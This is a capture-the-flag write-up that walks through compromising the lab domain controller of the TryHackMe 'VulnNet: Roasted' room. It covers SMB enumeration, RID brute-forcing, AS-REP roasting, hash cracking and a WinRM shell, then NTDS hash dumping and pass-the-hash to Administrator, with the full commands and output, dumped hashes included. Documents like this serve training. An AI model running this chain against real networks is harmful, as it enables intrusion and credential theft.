# VulnNet: Roasted

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Easy
Tags: Active Directory, Windows
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Free
Description:
VulnNet Entertainment quickly deployed another management instance on their very broad network...
```

Room link: [https://tryhackme.com/room/vulnnetroasted](https://tryhackme.com/room/vulnnetroasted)

## Solution

VulnNet Entertainment just deployed a new instance on their network with the newly-hired system administrators. Being a security-aware company, they as always hired you to perform a penetration test, and see how system administrators are performing.

- Difficulty: Easy
- Operating System: Windows

This is a much simpler machine, do not overthink. You can do it by following common methodologies.

**Note**: It *might* take up to 6 minutes for this machine to fully boot.

Icon made by [DinosoftLabs](https://www.flaticon.com/authors/dinosoftlabs) from [www.flaticon.com](https://www.flaticon.com/).

### Check for services with nmap

We start by scanning the machine on all ports with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ export TARGET_IP=10.113.163.173

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ sudo nmap -sC -sV -p- $TARGET_IP
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-28 12:39 +0200
Nmap scan report for 10.113.163.173
Host is up (0.024s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-28 10:41:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49808/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-28T10:41:54
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.15 seconds
```

We have the following main TCP-services running and available:

- Simple DNS Plus on port 53
- Microsoft Windows Kerberos on port 88
- Microsoft Windows RPC on port 135
- NetBIOS Session Service on port 139
- Microsoft Windows Active Directory LDAP on port 389 and 3268
- SMB on port 445
- Microsoft HTTPAPI httpd 2.0 (WinRM) on port 5985

From the output we see that this machine is a domain controller and the AD domain is `vulnnet-rst.local`.

We also do an UDP-scanning on the top 100 UDP-ports including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ sudo nmap -sU --top-ports 100 -sV -sC $TARGET_IP
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-28 12:47 +0200
Nmap scan report for 10.113.163.173
Host is up (0.027s latency).
Not shown: 97 open|filtered udp ports (no-response)
PORT    STATE SERVICE      VERSION
53/udp  open  domain       Simple DNS Plus
88/udp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-04-28 10:47:23Z)
123/udp open  ntp          NTP v3
| ntp-info: 
|_  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1195.22 seconds
```

We have the following UDP-services running and available:

- Simple DNS Plus on port 53
- Microsoft Windows Kerberos on port 88
- NTP v3 on port 123

### SMB Enumeration

Next, we check for SMB shares

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ nxc smb $TARGET_IP -u '' -p '' --shares
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\: 
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  [-] Error enumerating shares: STATUS_ACCESS_DENIED

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ nxc smb $TARGET_IP -u Guest -p '' --shares
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\Guest: 
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  [*] Enumerated shares
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  -----           -----------     ------
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  C$                              Default share
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  NETLOGON                        Logon server share 
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  SYSVOL                          Logon server share 
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing
```

and their contents

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ smbclient -U Guest --password='' //$TARGET_IP/VulnNet-Business-Anonymous -c 'recurse;ls'
  .                                   D        0  Sat Mar 13 03:46:40 2021
  ..                                  D        0  Sat Mar 13 03:46:40 2021
  Business-Manager.txt                A      758  Fri Mar 12 02:24:34 2021
  Business-Sections.txt               A      654  Fri Mar 12 02:24:34 2021
  Business-Tracking.txt               A      471  Fri Mar 12 02:24:34 2021

                8771839 blocks of size 4096. 4496488 blocks available

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ smbclient -U Guest --password='' //$TARGET_IP/VulnNet-Enterprise-Anonymous -c 'recurse;ls'
  .                                   D        0  Sat Mar 13 03:46:40 2021
  ..                                  D        0  Sat Mar 13 03:46:40 2021
  Enterprise-Operations.txt           A      467  Fri Mar 12 02:24:34 2021
  Enterprise-Safety.txt               A      503  Fri Mar 12 02:24:34 2021
  Enterprise-Sync.txt                 A      496  Fri Mar 12 02:24:34 2021

                8771839 blocks of size 4096. 4496488 blocks available
```

Let's download all files for analysis

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ smbclient -U Guest --password='' //$TARGET_IP/VulnNet-Business-Anonymous                
Try "help" to get a list of possible commands.
smb: \> mget *
Get file Business-Manager.txt? y
getting file \Business-Manager.txt of size 758 as Business-Manager.txt (5.8 KiloBytes/sec) (average 5.8 KiloBytes/sec)
Get file Business-Sections.txt? y
getting file \Business-Sections.txt of size 654 as Business-Sections.txt (5.9 KiloBytes/sec) (average 5.8 KiloBytes/sec)
Get file Business-Tracking.txt? y
getting file \Business-Tracking.txt of size 471 as Business-Tracking.txt (4.3 KiloBytes/sec) (average 5.4 KiloBytes/sec)
smb: \> exit

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ smbclient -U Guest --password='' //$TARGET_IP/VulnNet-Enterprise-Anonymous                
Try "help" to get a list of possible commands.
smb: \> mget *
Get file Enterprise-Operations.txt? y
getting file \Enterprise-Operations.txt of size 467 as Enterprise-Operations.txt (4.3 KiloBytes/sec) (average 4.3 KiloBytes/sec)
Get file Enterprise-Safety.txt? y
getting file \Enterprise-Safety.txt of size 503 as Enterprise-Safety.txt (4.5 KiloBytes/sec) (average 4.4 KiloBytes/sec)
Get file Enterprise-Sync.txt? y
getting file \Enterprise-Sync.txt of size 496 as Enterprise-Sync.txt (4.4 KiloBytes/sec) (average 4.4 KiloBytes/sec)
smb: \> exit
```

Analysing the files, we find the following (user) names:

- Alexa Whitehat
- Jack Goldenhand
- Johnny Leet
- Tony Skid

But we still don't know the format of the usernames.

### RID-bruteforcing usernames

So why not check if we can find usernames but bruteforcing RIDs

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ nxc smb $TARGET_IP -u Guest -p '' --rid-brute
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\Guest: 
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  500: VULNNET-RST\Administrator (SidTypeUser)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  501: VULNNET-RST\Guest (SidTypeUser)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  502: VULNNET-RST\krbtgt (SidTypeUser)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  512: VULNNET-RST\Domain Admins (SidTypeGroup)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  513: VULNNET-RST\Domain Users (SidTypeGroup)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  514: VULNNET-RST\Domain Guests (SidTypeGroup)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  515: VULNNET-RST\Domain Computers (SidTypeGroup)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  516: VULNNET-RST\Domain Controllers (SidTypeGroup)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  517: VULNNET-RST\Cert Publishers (SidTypeAlias)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  518: VULNNET-RST\Schema Admins (SidTypeGroup)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  525: VULNNET-RST\Protected Users (SidTypeGroup)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  526: VULNNET-RST\Key Admins (SidTypeGroup)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  1105: VULNNET-RST\a-whitehat (SidTypeUser)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  1109: VULNNET-RST\t-skid (SidTypeUser)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  1110: VULNNET-RST\j-goldenhand (SidTypeUser)
SMB         10.113.163.173  445    WIN-2BO8M1OE1M1  1111: VULNNET-RST\j-leet (SidTypeUser)
```

Success! We have the following usernames

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ cat usernames.txt                 
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```

### Try AS-REP Rosting

Based on the machine name, AS-REP roasting is probably a good next step.

We use `GetNPUsers.py` from the Impacket suite

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ impacket-GetNPUsers vulnnet-rst.local/ -dc-ip $TARGET_IP -no-pass -usersfile usernames.txt -outputfile hashes.txt         
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:469cfed8e7fea0d4a49a0cc43b9528eb$c2750c4f08cb89ae2c668e14510837b0ed3149dd2930d472789173df00629d3dc9a136860ad6a172158cabe5e02fbdfb630702be29b1d01a158dcedfcd2a90f9868d33ef9191532800c23452d73b7c9e7ff3a4860eb1a0b9ce72d5d44317d3ff70e130c3182050441401174a40546e7ba50ede37b61d4f46450ef6fbb43601f9f0b2008d7cbb3f5da1b1bc88a8cf9cba8d37a8112c519ae5ed13592ded65dea00266fd4c94422fa338a0909ae4a65630bda553ac872801fd37cf865cadf0e33d43cef71a91987b9b719be691fa7806b0d2b895d230c87d94cca4155fa693e29be28ede7ab90d25ba791393047f2d3fdf8621e87bec44
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### Crack the hash

Then we crack the hash with John the Ripper and the Rockyou wordlist

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)     
1g 0:00:00:02 DONE (2026-04-28 14:10) 0.3717g/s 1181Kp/s 1181Kc/s 1181KC/s tjalling..tj0216044
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Nice! We now have a set of credentials: `t-skid:tj072889*`

### SMB Enumeration - Part 2

Now that we have new credentials, we should re-check the SMB shares

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ nxc smb $TARGET_IP -u t-skid -p 'tj072889*' --shares               
SMB         10.114.167.247  445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.114.167.247  445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\t-skid:tj072889* 
SMB         10.114.167.247  445    WIN-2BO8M1OE1M1  [*] Enumerated shares
SMB         10.114.167.247  445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
SMB         10.114.167.247  445    WIN-2BO8M1OE1M1  -----           -----------     ------
SMB         10.114.167.247  445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
SMB         10.114.167.247  445    WIN-2BO8M1OE1M1  C$                              Default share
SMB         10.114.167.247  445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
SMB         10.114.167.247  445    WIN-2BO8M1OE1M1  NETLOGON        READ            Logon server share 
SMB         10.114.167.247  445    WIN-2BO8M1OE1M1  SYSVOL          READ            Logon server share 
SMB         10.114.167.247  445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing
SMB         10.114.167.247  445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing
```

Now we also have access to the NETLOGON and SYSVOL shares.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ smbclient -U t-skid --password='tj072889*' //$TARGET_IP/NETLOGON    
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Mar 17 00:15:49 2021
  ..                                  D        0  Wed Mar 17 00:15:49 2021
  ResetPassword.vbs                   A     2821  Wed Mar 17 00:18:14 2021

                8771839 blocks of size 4096. 4505104 blocks available
smb: \> mget *
Get file ResetPassword.vbs? y
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (10.6 KiloBytes/sec) (average 10.6 KiloBytes/sec)
smb: \> exit

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ head -n20 ResetPassword.vbs
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"

' Determine DNS domain name from RootDSE object.
```

Ah, we have another set of credentials: `a-whitehat:bNdKVkjv3RR9ht`

### Connect as a-whitehat with WinRM

Let's check if this user has access with WinRM

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ nxc winrm $TARGET_IP -u a-whitehat -p 'bNdKVkjv3RR9ht' -d vulnnet-rst.local
WINRM       10.113.167.49   5985   WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.113.167.49   5985   WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
```

Yes, we can connect and we have Admin-access.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ evil-winrm -i $TARGET_IP -u a-whitehat -p 'bNdKVkjv3RR9ht'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> 
```

### Get the user flag

Now we can search for the user flag

```powershell
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\a-whitehat\Desktop> dir
*Evil-WinRM* PS C:\Users\a-whitehat\Desktop> where.exe /R C:\Users user.txt
C:\Users\enterprise-core-vn\Desktop\user.txt
*Evil-WinRM* PS C:\Users\a-whitehat\Desktop> Get-Content C:\Users\enterprise-core-vn\Desktop\user.txt
THM{<REDACTED>}
*Evil-WinRM* PS C:\Users\a-whitehat\Desktop> 
```

### Dump hashes

Next, we check if we can dump the hashes from NTDS.DIT

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ impacket-secretsdump -just-dc vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@$TARGET_IP 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
vulnnet-rst.local\enterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf:::
vulnnet-rst.local\a-whitehat:1105:aad3b435b51404eeaad3b435b51404ee:1bd408897141aa076d62e9bfc1a5956b:::
vulnnet-rst.local\t-skid:1109:aad3b435b51404eeaad3b435b51404ee:49840e8a32937578f8c55fdca55ac60b:::
vulnnet-rst.local\j-goldenhand:1110:aad3b435b51404eeaad3b435b51404ee:1b1565ec2b57b756b912b5dc36bc272a:::
vulnnet-rst.local\j-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181adeca1471027e022:::
WIN-2BO8M1OE1M1$:1000:aad3b435b51404eeaad3b435b51404ee:95bc09e77a1c2237bd0d4fa8d0844191:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:7f9adcf2cb65ebb5babde6ec63e0c8165a982195415d81376d1f4ae45072ab83
Administrator:aes128-cts-hmac-sha1-96:d9d0cc6b879ca5b7cfa7633ffc81b849
Administrator:des-cbc-md5:52d325cb2acd8fc1
krbtgt:aes256-cts-hmac-sha1-96:a27160e8a53b1b151fa34f45524a07eb9899ebdf0051b20d677f0c3b518885bd
krbtgt:aes128-cts-hmac-sha1-96:75c22aac8f2b729a3a5acacec729e353
krbtgt:des-cbc-md5:1357f2e9d3bc0bd3
vulnnet-rst.local\enterprise-core-vn:aes256-cts-hmac-sha1-96:9da9e2e1e8b5093fb17b9a4492653ceab4d57a451bd41de36b7f6e06e91e98f3
vulnnet-rst.local\enterprise-core-vn:aes128-cts-hmac-sha1-96:47ca3e5209bc0a75b5622d20c4c81d46
vulnnet-rst.local\enterprise-core-vn:des-cbc-md5:200e0102ce868016
vulnnet-rst.local\a-whitehat:aes256-cts-hmac-sha1-96:f0858a267acc0a7170e8ee9a57168a0e1439dc0faf6bc0858a57687a504e4e4c
vulnnet-rst.local\a-whitehat:aes128-cts-hmac-sha1-96:3fafd145cdf36acaf1c0e3ca1d1c5c8d
vulnnet-rst.local\a-whitehat:des-cbc-md5:028032c2a8043ddf
vulnnet-rst.local\t-skid:aes256-cts-hmac-sha1-96:a7d2006d21285baee8e46454649f3bd4a1790c7f4be7dd0ce72360dc6c962032
vulnnet-rst.local\t-skid:aes128-cts-hmac-sha1-96:8bdfe91cca8b16d1b3b3fb6c02565d16
vulnnet-rst.local\t-skid:des-cbc-md5:25c2739dcb646bfd
vulnnet-rst.local\j-goldenhand:aes256-cts-hmac-sha1-96:fc08aeb44404f23ff98ebc3aba97242155060928425ec583a7f128a218e4c5ad
vulnnet-rst.local\j-goldenhand:aes128-cts-hmac-sha1-96:7d218a77c73d2ea643779ac9b125230a
vulnnet-rst.local\j-goldenhand:des-cbc-md5:c4e65d49feb63180
vulnnet-rst.local\j-leet:aes256-cts-hmac-sha1-96:1327c55f2fa5e4855d990962d24986b63921bd8a10c02e862653a0ac44319c62
vulnnet-rst.local\j-leet:aes128-cts-hmac-sha1-96:f5d92fe6dc0f8e823f229fab824c1aa9
vulnnet-rst.local\j-leet:des-cbc-md5:0815580254a49854
WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:cdd178665af7ea0a4720431697bbfc3725a93e505e80ebc9ce0cc5c93f787b91
WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:f5b4b134db887f4a536abe4abc888044
WIN-2BO8M1OE1M1$:des-cbc-md5:a2b6ce3458a1d99b
[*] Cleaning up... 
```

### Pass-the-hash as Administrator

We can then re-use the Administrator's NTLM-hash to connect

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/VulnNet_Roasted]
└─$ evil-winrm -i $TARGET_IP -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d                                            
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
vulnnet-rst\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

### Get the root flag

Finally, we get the root/system flag

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:34 PM             39 system.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type system.txt
THM{<REDACTED>}
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```

For additional information, please see the references below.

## References

- [Active Directory - Wikipedia](https://en.wikipedia.org/wiki/Active_Directory)
- [Domain Name System - Wikipedia](https://en.wikipedia.org/wiki/Domain_Name_System)
- [Evil-WinRM - GitHub](https://github.com/Hackplayers/evil-winrm)
- [Evil-WinRM - Kali Tools](https://www.kali.org/tools/evil-winrm/)
- [export - Linux manual page](https://www.man7.org/linux/man-pages/man1/export.1p.html)
- [Get-Content - Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-content?view=powershell-5.1)
- [head - Linux manual page](https://man7.org/linux/man-pages/man1/head.1.html)
- [Impacket - GitHub](https://github.com/fortra/impacket)
- [Impacket - Homepage](https://www.coresecurity.com/core-labs/impacket)
- [Impacket - Kali Tools](https://www.kali.org/tools/impacket/)
- [Impacket-scripts - Kali Tools](https://www.kali.org/tools/impacket-scripts/)
- [John the Ripper - Homepage](https://www.openwall.com/john/)
- [john - Kali Tools](https://www.kali.org/tools/john/)
- [Kerberos (protocol) - Wikipedia](https://en.wikipedia.org/wiki/Kerberos_(protocol))
- [Lightweight Directory Access Protocol - Wikipedia](https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol)
- [Microsoft RPC - Wikipedia](https://en.wikipedia.org/wiki/Microsoft_RPC)
- [NetExec - GitHub](https://github.com/Pennyw0rth/NetExec)
- [NetExec - Kali Tools](https://www.kali.org/tools/netexec/)
- [NetExec - Wiki](https://www.netexec.wiki)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [Server Message Block - Wikipedia](https://en.wikipedia.org/wiki/Server_Message_Block)
- [smbclient - Kali Tools](https://www.kali.org/tools/samba/#smbclient)
- [smbclient - Linux manual page](https://linux.die.net/man/1/smbclient)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [type - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type)
- [where - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/where)
- [whoami - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami)
- [Windows Remote Management - Wikipedia](https://en.wikipedia.org/wiki/Windows_Remote_Management)
